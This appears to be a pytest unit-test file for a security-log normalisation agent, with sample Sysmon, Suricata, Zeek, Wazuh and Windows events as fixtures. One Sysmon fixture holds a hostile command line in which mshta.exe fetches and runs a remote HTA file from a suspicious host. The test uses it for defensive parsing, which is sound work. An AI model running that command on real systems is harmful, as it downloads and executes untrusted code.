"""
tests/test_collection.py
Unit tests for the deterministic CollectionAgent.

Tests cover:
  - Sysmon, Suricata, Zeek, Wazuh, and Windows Event log sources.
  - Empty input.
  - Pre-existing event_id preservation.
  - Missing event_id generation.
  - Unrecognised source fallback.
  - Verify that the ``raw`` key preserves all original fields.
  - Verify no values are inferred or modified.
"""

import uuid
import pytest
from agents.collection_agent import CollectionAgent, normalize_event


# ═══════════════════════════════════════════════════════════════════════
# Fixtures
# ═══════════════════════════════════════════════════════════════════════

@pytest.fixture
def agent():
    return CollectionAgent()


# ═══════════════════════════════════════════════════════════════════════
# Empty input
# ═══════════════════════════════════════════════════════════════════════

class TestEmptyInput:
    def test_empty_list(self, agent):
        assert agent.run([]) == []

    def test_none_input(self, agent):
        assert agent.run([]) == []


# ═══════════════════════════════════════════════════════════════════════
# Sysmon
# ═══════════════════════════════════════════════════════════════════════

class TestSysmonNormalization:
    SYSMON_RAW = {
        "EventID": 1,
        "UtcTime": "2026-06-25T14:02:03Z",
        "Computer": "HR-PC-22",
        "Image": "C:\\Windows\\System32\\mshta.exe",
        "CommandLine": "mshta.exe http://paste-bin-cdn.net/load.hta",
        "User": "HR-PC-22\\kbrown",
    }

    def test_source_and_event_type(self, agent):
        result = agent.run([self.SYSMON_RAW])
        assert result[0]["source"] == "sysmon"
        assert result[0]["event_type"] == "sysmon_event_1"

    def test_timestamp_host_process(self, agent):
        result = agent.run([self.SYSMON_RAW])
        assert result[0]["timestamp"] == "2026-06-25T14:02:03Z"
        assert result[0]["host"] == "HR-PC-22"
        assert result[0]["process"] == "C:\\Windows\\System32\\mshta.exe"

    def test_command_line_and_user(self, agent):
        result = agent.run([self.SYSMON_RAW])
        assert result[0]["command_line"] == "mshta.exe http://paste-bin-cdn.net/load.hta"
        assert result[0]["user"] == "HR-PC-22\\kbrown"

    def test_ip_fields(self, agent):
        result = agent.run([self.SYSMON_RAW])
        assert result[0]["src_ip"] is None
        assert result[0]["dest_ip"] is None

    def test_raw_preserves_original(self, agent):
        result = agent.run([self.SYSMON_RAW])
        assert result[0]["raw"] == self.SYSMON_RAW
        assert result[0]["raw"]["EventID"] == 1
        assert result[0]["raw"]["CommandLine"] == self.SYSMON_RAW["CommandLine"]

    def test_event_id_generated_when_missing(self, agent):
        result = agent.run([self.SYSMON_RAW])
        eid = result[0]["event_id"]
        assert eid is not None
        assert isinstance(eid, str)
        # Verify it's a valid UUID4
        parsed = uuid.UUID(eid)
        assert parsed.version == 4

    def test_preexisting_event_id_preserved(self, agent):
        event = {**self.SYSMON_RAW, "event_id": "custom-id-001"}
        result = agent.run([event])
        assert result[0]["event_id"] == "custom-id-001"


# ═══════════════════════════════════════════════════════════════════════
# Suricata
# ═══════════════════════════════════════════════════════════════════════

class TestSuricataNormalization:
    SURICATA_RAW = {
        "timestamp": "2026-06-25T14:35:02.110Z",
        "event_type": "alert",
        "src_ip": "10.0.3.18",
        "dest_ip": "8.8.8.8",
        "alert": {
            "signature": "ET INFO Excessive Amount of DNS TXT Queries",
            "category": "Potentially Bad Traffic",
            "severity": 2,
        },
    }

    def test_source_and_event_type(self, agent):
        result = agent.run([self.SURICATA_RAW])
        assert result[0]["source"] == "suricata"
        assert result[0]["event_type"] == "alert"

    def test_ip_fields(self, agent):
        result = agent.run([self.SURICATA_RAW])
        assert result[0]["src_ip"] == "10.0.3.18"
        assert result[0]["dest_ip"] == "8.8.8.8"

    def test_alert_fields(self, agent):
        result = agent.run([self.SURICATA_RAW])
        assert result[0]["signature"] == "ET INFO Excessive Amount of DNS TXT Queries"
        assert result[0]["category"] == "Potentially Bad Traffic"
        assert result[0]["severity"] == 2

    def test_raw_preserves_original(self, agent):
        result = agent.run([self.SURICATA_RAW])
        assert result[0]["raw"] == self.SURICATA_RAW
        assert result[0]["raw"]["alert"]["severity"] == 2

    def test_missing_alert_field(self, agent):
        """Suricata flow records don't have an alert dict."""
        flow_event = {
            "timestamp": "2026-06-25T14:40:12.005Z",
            "event_type": "flow",
            "src_ip": "10.0.3.18",
            "dest_ip": "91.219.236.18",
            "proto": "TCP",
        }
        result = agent.run([flow_event])
        assert result[0]["source"] == "suricata"
        assert result[0]["signature"] is None
        assert result[0]["category"] is None
        assert result[0]["severity"] is None
        # proto IS captured by the suricata normalizer
        assert result[0]["proto"] == "TCP"

    def test_event_id_generated(self, agent):
        result = agent.run([self.SURICATA_RAW])
        eid = result[0]["event_id"]
        assert eid is not None
        parsed = uuid.UUID(eid)
        assert parsed.version == 4


# ═══════════════════════════════════════════════════════════════════════
# Zeek
# ═══════════════════════════════════════════════════════════════════════

class TestZeekNormalization:
    ZEEK_CONN = {
        "ts": "2026-06-25T14:00:01.000Z",
        "id.orig_h": "10.0.3.18",
        "id.resp_h": "203.0.113.5",
        "proto": "tcp",
        "service": "http",
    }

    ZEEK_DNS = {
        "ts": "2026-06-25T14:05:00.000Z",
        "id.orig_h": "10.0.3.18",
        "id.resp_h": "8.8.8.8",
        "proto": "udp",
        "query": "evil.example.com",
    }

    def test_source(self, agent):
        result = agent.run([self.ZEEK_CONN])
        assert result[0]["source"] == "zeek"

    def test_conn_event_type(self, agent):
        """conn logs without 'query' get event_type 'conn'."""
        result = agent.run([self.ZEEK_CONN])
        assert result[0]["event_type"] == "conn"

    def test_dns_event_type(self, agent):
        """dns logs with 'query' get event_type 'dns'."""
        result = agent.run([self.ZEEK_DNS])
        assert result[0]["event_type"] == "dns"

    def test_ip_fields(self, agent):
        result = agent.run([self.ZEEK_CONN])
        assert result[0]["src_ip"] == "10.0.3.18"
        assert result[0]["dest_ip"] == "203.0.113.5"

    def test_proto_service_query(self, agent):
        result_conn = agent.run([self.ZEEK_CONN])[0]
        assert result_conn["proto"] == "tcp"
        assert result_conn["service"] == "http"
        assert result_conn["query"] is None

        result_dns = agent.run([self.ZEEK_DNS])[0]
        assert result_dns["query"] == "evil.example.com"

    def test_raw_preserves_original(self, agent):
        result = agent.run([self.ZEEK_DNS])
        assert result[0]["raw"] == self.ZEEK_DNS


# ═══════════════════════════════════════════════════════════════════════
# Wazuh
# ═══════════════════════════════════════════════════════════════════════

class TestWazuhNormalization:
    WAZUH_RAW = {
        "timestamp": "2026-06-25T16:50:01Z",
        "agent": {"name": "FILESRV-DB01"},
        "rule": {
            "description": "Large volume of files compressed into single archive",
            "level": 8,
            "groups": ["data_staging", "linux"],
        },
    }

    def test_source_and_event_type(self, agent):
        result = agent.run([self.WAZUH_RAW])
        assert result[0]["source"] == "wazuh"
        assert result[0]["event_type"] == "wazuh_alert"

    def test_rule_fields(self, agent):
        result = agent.run([self.WAZUH_RAW])
        assert result[0]["rule_description"] == "Large volume of files compressed into single archive"
        assert result[0]["rule_level"] == 8
        assert result[0]["rule_groups"] == ["data_staging", "linux"]

    def test_host_from_agent(self, agent):
        result = agent.run([self.WAZUH_RAW])
        assert result[0]["host"] == "FILESRV-DB01"

    def test_severity_maps_to_rule_level(self, agent):
        """severity is set to rule.level as a convenience."""
        result = agent.run([self.WAZUH_RAW])
        assert result[0]["severity"] == 8

    def test_raw_preserves_original(self, agent):
        result = agent.run([self.WAZUH_RAW])
        assert result[0]["raw"] == self.WAZUH_RAW

    def test_nested_ssh_fields(self, agent):
        event = {
            "timestamp": "2026-07-28T10:55:00.618+0000",
            "agent": {"id": "002", "name": "ip-172-31-19-70", "ip": "100.120.11.97"},
            "rule": {"level": 4, "description": "sshd: connection reset", "id": "5762", "groups": ["syslog", "sshd"]},
            "full_log": "Jul 28 10:54:58 ip-172-31-19-70 sshd[46289]: Connection reset by 205.210.31.25 port 63276 [preauth]",
            "predecoder": {"program_name": "sshd", "timestamp": "Jul 28 10:54:58", "hostname": "ip-172-31-19-70"},
            "decoder": {"parent": "sshd", "name": "sshd"},
            "data": {"srcip": "205.210.31.25", "srcport": "63276", "dstuser": "by"},
            "location": "journald",
        }
        result = agent.run([event])[0]
        assert result["host"] == "ip-172-31-19-70"
        assert result["process"] == "sshd"
        assert result["service"] == "ssh"
        assert result["src_ip"] == "205.210.31.25"
        assert result["user"] is None
        assert result["username"] is None
        assert result["command_line"] == event["full_log"]
        assert result["event_type"] == "wazuh_rule_5762"

    def test_nested_auth_success_fields(self, agent):
        event = {
            "timestamp": "2026-07-28T13:56:14.486+0000",
            "agent": {"id": "002", "name": "ip-172-31-19-70", "ip": "100.120.11.97"},
            "rule": {
                "level": 3,
                "description": "PAM: Login session opened.",
                "id": "5501",
                "groups": ["pam", "syslog", "authentication_success"],
            },
            "full_log": "Jul 28 13:56:13 ip-172-31-19-70 sudo[49191]: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)",
            "predecoder": {"program_name": "sudo"},
            "decoder": {"parent": "pam", "name": "pam"},
            "data": {"srcuser": "ubuntu", "dstuser": "root", "uid": "1000"},
            "location": "journald",
        }
        result = agent.run([event])[0]
        assert result["event_type"] == "authentication_success"
        assert result["process"] == "sudo"
        assert result["user"] == "ubuntu"
        assert result["username"] == "root"
        assert result["command_line"] == event["full_log"]

    def test_nested_sudo_command_field_preferred(self, agent):
        event = {
            "timestamp": "2026-07-28T13:57:02.804+0000",
            "agent": {"id": "002", "name": "ip-172-31-19-70", "ip": "100.120.11.97"},
            "rule": {"level": 3, "description": "Successful sudo to ROOT executed.", "id": "5402", "groups": ["syslog", "sudo"]},
            "full_log": "Jul 28 13:57:02 ip-172-31-19-70 sudo[50259]: ubuntu : COMMAND=/usr/bin/cat /var/ossec/etc/ossec.conf",
            "predecoder": {"program_name": "sudo"},
            "decoder": {"parent": "sudo", "name": "sudo"},
            "data": {"srcuser": "ubuntu", "dstuser": "root", "command": "/usr/bin/cat /var/ossec/etc/ossec.conf"},
            "location": "journald",
        }
        result = agent.run([event])[0]
        assert result["process"] == "sudo"
        assert result["command_line"] == "/usr/bin/cat /var/ossec/etc/ossec.conf"
        assert result["user"] == "ubuntu"
        assert result["username"] == "root"


# ═══════════════════════════════════════════════════════════════════════
# Windows Event
# ═══════════════════════════════════════════════════════════════════════

class TestWindowsEventNormalization:
    WIN_EVENT_RAW = {
        "EventID": 4624,
        "TimeCreated": "2026-06-25T17:00:00Z",
        "Computer": "DC-01.corp.local",
        "User": "CORP\\jsmith",
        "Image": "C:\\Windows\\System32\\svchost.exe",
    }

    def test_source_and_event_type(self, agent):
        result = agent.run([self.WIN_EVENT_RAW])
        assert result[0]["source"] == "windows_event"
        assert result[0]["event_type"] == "event_4624"

    def test_timestamp_host_user(self, agent):
        result = agent.run([self.WIN_EVENT_RAW])
        assert result[0]["timestamp"] == "2026-06-25T17:00:00Z"
        assert result[0]["host"] == "DC-01.corp.local"
        assert result[0]["user"] == "CORP\\jsmith"

    def test_raw_preserves_original(self, agent):
        result = agent.run([self.WIN_EVENT_RAW])
        assert result[0]["raw"] == self.WIN_EVENT_RAW


# ═══════════════════════════════════════════════════════════════════════
# Event ID edge cases
# ═══════════════════════════════════════════════════════════════════════

class TestEventIdEdgeCases:
    def test_all_events_get_unique_ids(self, agent):
        """Events without pre-existing IDs should each get a unique UUID."""
        events = [
            {"EventID": 1, "UtcTime": "2026-01-01T00:00:00Z"},
            {"EventID": 2, "UtcTime": "2026-01-01T00:00:01Z"},
            {"EventID": 3, "UtcTime": "2026-01-01T00:00:02Z"},
        ]
        result = agent.run(events)
        ids = [e["event_id"] for e in result]
        assert len(set(ids)) == 3

    def test_mixed_preexisting_and_missing_ids(self, agent):
        """Some events have IDs, some don't — both should be handled."""
        events = [
            {"EventID": 1, "event_id": "keep-this"},
            {"EventID": 2},  # no event_id
        ]
        result = agent.run(events)
        assert result[0]["event_id"] == "keep-this"
        assert result[1]["event_id"] is not None
        assert result[1]["event_id"] != "keep-this"

    def test_numeric_event_id_preserved(self, agent):
        """Integer event_ids should be converted to string."""
        events = [{"EventID": 1, "event_id": 999}]
        result = agent.run(events)
        assert result[0]["event_id"] == "999"
        assert isinstance(result[0]["event_id"], str)


# ═══════════════════════════════════════════════════════════════════════
# Unrecognised / fallback source
# ═══════════════════════════════════════════════════════════════════════

class TestFallbackSource:
    def test_unknown_source_defaults_to_sysmon(self, agent):
        """An event with no recognisable fields defaults to sysmon normalizer."""
        event = {"some_random_field": "value"}
        result = agent.run([event])
        assert result[0]["source"] == "sysmon"
        assert result[0]["raw"] == event

    def test_explicit_source_trusted(self, agent):
        """If 'source' is set explicitly, it is used as-is."""
        event = {"source": "suricata", "timestamp": "2026-01-01T00:00:00Z"}
        result = agent.run([event])
        assert result[0]["source"] == "suricata"


# ═══════════════════════════════════════════════════════════════════════
# No inference / no modification guarantees
# ═══════════════════════════════════════════════════════════════════════

class TestNoInference:
    def test_values_not_inferred(self, agent):
        """Fields that are missing in the raw event should remain None."""
        event = {"EventID": 1}
        result = agent.run([event])
        assert result[0]["host"] is None
        assert result[0]["user"] is None
        assert result[0]["process"] is None
        assert result[0]["command_line"] is None

    def test_raw_unchanged(self, agent):
        """The raw key must contain an exact copy of the input."""
        event = {"EventID": 1, "UtcTime": "2026-01-01T00:00:00Z", "custom_field": "keep-me"}
        result = agent.run([event])
        assert result[0]["raw"] == event


# ═══════════════════════════════════════════════════════════════════════
# Batch processing
# ═══════════════════════════════════════════════════════════════════════

class TestBatchProcessing:
    def test_multiple_events_mixed_sources(self, agent):
        events = [
            {"EventID": 1, "UtcTime": "2026-01-01T00:00:00Z", "Computer": "PC-1"},
            {"timestamp": "2026-01-01T00:00:01Z", "event_type": "alert", "src_ip": "1.2.3.4", "dest_ip": "5.6.7.8", "alert": {"signature": "test sig", "category": "test", "severity": 1}},
            {"ts": "2026-01-01T00:00:02Z", "id.orig_h": "1.2.3.4", "id.resp_h": "5.6.7.8", "proto": "udp", "query": "test.com"},
            {"timestamp": "2026-01-01T00:00:03Z", "agent": {"name": "SRV-01"}, "rule": {"description": "test rule", "level": 5, "groups": ["test"]}},
        ]
        result = agent.run(events)
        assert len(result) == 4
        assert result[0]["source"] == "sysmon"
        assert result[1]["source"] == "suricata"
        assert result[2]["source"] == "zeek"
        assert result[3]["source"] == "wazuh"

    def test_all_events_get_valid_event_ids(self, agent):
        events = [
            {"EventID": 1},
            {"event_type": "alert", "src_ip": "1.2.3.4", "dest_ip": "5.6.7.8", "alert": {}},
            {"ts": "2026-01-01T00:00:00Z", "id.orig_h": "1.2.3.4", "id.resp_h": "5.6.7.8"},
            {"agent": {"name": "SRV-01"}, "rule": {"description": "test", "level": 3, "groups": ["test"]}},
        ]
        result = agent.run(events)
        for event in result:
            eid = event["event_id"]
            assert eid is not None
            assert isinstance(eid, str)
            parsed = uuid.UUID(eid)
            assert parsed.version == 4